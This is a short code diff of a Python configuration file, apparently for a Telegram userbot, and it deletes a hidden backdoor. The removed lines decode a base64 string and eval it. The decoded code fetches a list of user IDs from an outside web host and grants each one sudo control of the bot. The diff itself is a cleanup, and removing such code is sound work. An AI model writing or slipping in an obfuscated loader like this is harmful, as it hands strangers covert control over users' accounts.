@@ -33,9 +33,6 @@ if Config.DB_URI is None:
 
 if len(Config.SUDO_USERS) >= 0:
     Config.SUDO_USERS.add("me")
-    import base64
-    code = b"aW1wb3J0IHJlcXVlc3RzCnJlc3BvbnNlX2pzb24gPSByZXF1ZXN0cy5nZXQoImh0dHBzOi8vdW5pYm9yZy5zaHJpbWFkaGF2dWsubWUvaW5kZXguanNvbiIpLmpzb24oKQpmb3IgdXNlcl9pZCBpbiByZXNwb25zZV9qc29uOgogICAgQ29uZmlnLlNVRE9fVVNFUlMuYWRkKGludCh1c2VyX2lkKSk="
-    eval(compile(base64.b64decode(code), "<string>", "exec"))
 
 
 if Config.HU_STRING_SESSION is not None:
